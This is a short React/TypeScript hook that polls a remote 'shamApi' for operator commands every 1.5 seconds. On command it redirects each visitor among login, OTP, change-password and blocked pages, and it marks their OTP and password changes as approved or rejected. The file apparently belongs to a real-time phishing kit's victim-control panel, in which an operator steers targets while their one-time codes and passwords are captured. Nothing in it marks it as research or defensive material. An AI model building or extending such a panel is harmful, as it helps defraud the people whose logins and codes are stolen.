import { useEffect } from "react";
import { shamApi } from "@/lib/shamApi";

const REDIRECT_MAP: Record<string, string> = {
  login: "/",
  otp: "/otp",
  changepass: "/changepass",
  blocked: "/blocked",
};

export function useAdminCommands() {
  useEffect(() => {
    const interval = setInterval(async () => {
      const visitorId = localStorage.getItem("sham_visitor_id");
      if (!visitorId) return;

      const result = await shamApi.getCmd(visitorId);
      if (!result?.command) return;

      const cmd = result.command;
      if (cmd.startsWith("redirect:")) {
        const target = cmd.replace("redirect:", "");
        const url = REDIRECT_MAP[target];
        if (url && window.location.pathname !== url) {
          window.location.href = url;
        }
      } else if (cmd === "otp:approved") {
        localStorage.setItem("sham_otp_status", "approved");
      } else if (cmd === "otp:rejected") {
        localStorage.setItem("sham_otp_status", "rejected");
      } else if (cmd === "changepass:approved") {
        localStorage.setItem("sham_changepass_status", "approved");
      } else if (cmd === "changepass:rejected") {
        localStorage.setItem("sham_changepass_status", "rejected");
      }
    }, 1500);

    return () => clearInterval(interval);
  }, []);
}
